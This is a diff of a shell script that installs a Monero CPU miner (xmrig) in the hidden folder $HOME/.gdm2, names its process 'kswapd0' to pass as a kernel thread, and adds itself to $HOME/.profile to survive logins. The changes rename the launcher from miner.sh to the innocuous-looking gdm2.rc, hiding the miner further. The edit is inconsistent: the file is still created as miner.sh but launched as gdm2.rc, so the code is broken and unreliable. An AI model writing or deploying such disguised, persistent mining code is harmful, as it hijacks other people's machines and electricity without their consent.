@@ -122,7 +122,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.gdm2/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.gdm2/gdm2.rc script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -242,7 +242,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 
 killall xmrig
 
-echo "[*] Creating $HOME/.gdm2/miner.sh script"
+echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
 cat >$HOME/.gdm2/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
@@ -258,14 +258,14 @@ chmod +x $HOME/.gdm2/miner.sh
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.gdm2/miner.sh script to $HOME/.profile"
-    echo "$HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
+    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.gdm2/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -277,7 +277,7 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
